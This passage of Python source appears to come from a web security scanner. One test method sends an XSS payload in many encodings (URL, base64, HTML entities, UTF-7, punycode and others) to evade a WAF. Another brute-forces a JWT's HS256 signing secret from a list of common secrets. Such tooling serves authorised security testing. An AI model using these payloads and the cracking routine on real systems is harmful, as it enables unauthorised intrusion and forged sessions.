    def test_bypass_encoding_cascade(self):
        """Wave3 Bypass #3 — Encoding Cascade Bypass Engine."""
        if not self.deep: return
        self._print("[*]", "Wave3: Encoding Cascade Bypass...", "INFO")
        import urllib.parse, base64
        base = "<script>alert(1)</script>"
        cascades = [
            ("url-1x", urllib.parse.quote(base)),
            ("url-2x", urllib.parse.quote(urllib.parse.quote(base))),
            ("url-3x", urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(base)))),
            ("url-7x", base),  # 7 levels
            ("b64-1x", base64.b64encode(base.encode()).decode()),
            ("b64-2x", base64.b64encode(base64.b64encode(base.encode())).decode()),
            ("b64-3x", base64.b64encode(base64.b64encode(base64.b64encode(base.encode()).decode().encode())).decode()),
            ("hex", "".join(f"%{ord(c):02x}" for c in base)),
            ("octal", "".join(f"\\{ord(c):o}" for c in base)),
            ("html-dec", "".join(f"&#{ord(c)};" for c in base)),
            ("html-hex", "".join(f"&#x{ord(c):x};" for c in base)),
            ("js-unicode", "".join(f"\\u{ord(c):04x}" for c in base)),
            ("css-escape", "".join(f"\\{ord(c):x}" for c in base)),
            ("utf16-be", base.encode("utf-16-be").hex()),
            ("utf16-le", base.encode("utf-16-le").hex()),
            ("utf7", base.encode("utf-7").decode()),
            ("utf32-be", base.encode("utf-32-be").hex()),
            ("ucs2", base.encode("utf-16").hex()),
            ("punycode", "xn--" + base.encode("punycode").decode()),
        ]
        for label, payload in cascades:
            for param in ["q", "name", "search"]:
                r = self._get(self.target, params={param: payload})
                if not r: continue
                if "alert(1)" in (r.text or "") or "<script>" in (r.text or ""):
                    self._add_vuln(f"Wave3 Encoding Cascade: {label}",
                                    "HIGH", self.target,
                                    f"WAF bypassed via {label} encoding",
                                    label=label, param=param)

    def test_bypass_jwt_secret_bruteforce(self):
        """Wave3 Bypass #5 — JWT Secret Brute-Force Engine."""
        if not self.deep: return
        self._print("[*]", "Wave3: JWT Secret Brute-Force...", "INFO")
        import base64, hmac, hashlib, json as _json
        # Get a JWT from the target
        r = self._get(self.target)
        if not r: return
        cookies = r.cookies.get_dict() if hasattr(r.cookies, 'get_dict') else {}
        jwt_token = None
        for v in list(cookies.values()) + [r.headers.get("Authorization", "").replace("Bearer ", "")]:
            if v and v.count(".") == 2:
                jwt_token = v
                break
        if not jwt_token: return
        try:
            parts = jwt_token.split(".")
            header = _json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = _json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            provided_sig = parts[2]
        except Exception: return
        # Only attempt HS256
        if header.get("alg") != "HS256": return
        # Common JWT secrets (50+)
        common_secrets = [
            "secret", "Secret", "SECRET",
            "your-256-bit-secret", "your-secret-key",
            "supersecret", "mysecret", "jwtsecret",
            "changeme", "password", "admin", "root",
            "key", "private", "private_key",
            "default", "test", "demo", "example",
            "abc", "xyz", "123", "123456", "12345678",
            "qwerty", "asdfgh", "zxcvbn",
            "secretkey", "jwt", "token",
            "your-secret", "secret-key", "secret_key",
            "HS256", "JWT", "Bearer",
            "none", "null", "undefined",
            "api", "apikey", "api_key",
            "auth", "authkey", "auth_key",
            "session", "sessionkey", "session_key",
            "user", "username", "userkey",
            "admin-secret", "admin-key",
            "client-secret", "client-key",
            "app-secret", "app-key",
            "web-secret", "web-key",
            "server-secret", "server-key",
            "service-secret", "service-key",
            "private-secret", "private-key",
            "public-secret", "public-key",
        ]
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        for secret in common_secrets:
            expected_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input,
                          hashlib.sha256).digest()
            ).rstrip(b"=").decode()
            if expected_sig == provided_sig:
                self._add_vuln(f"Wave3 JWT Secret Brute-Force: '{secret}'",
                                "CRITICAL", self.target,
                                f"JWT signing secret is '{secret}' (common secret)",
                                secret=secret)
                return

